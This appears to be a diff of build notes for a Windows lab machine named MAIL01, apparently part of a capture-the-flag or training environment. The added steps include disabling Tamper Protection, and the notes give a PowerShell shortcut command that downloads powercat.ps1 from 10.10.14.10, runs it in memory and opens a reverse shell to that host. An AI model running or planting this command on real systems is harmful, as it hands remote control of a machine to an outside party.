@@ -4,8 +4,14 @@ Hostname: MAIL01
 Log in as: Administrator
 
 
-Instructions (after completing setup): 
+Instructions (before completing setup): 
+- Fully Update System
+- Install VMWare Tools
+- Disable Tamper Protection
+- Set the Device to Never go to Sleep
 
+
+Instructions (after completing setup):
 1. Create the PowerShell shortcut file:
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.10:8002/powercat.ps1'); powercat -c 10.10.14.10 -p 4446 -e powershell"
 
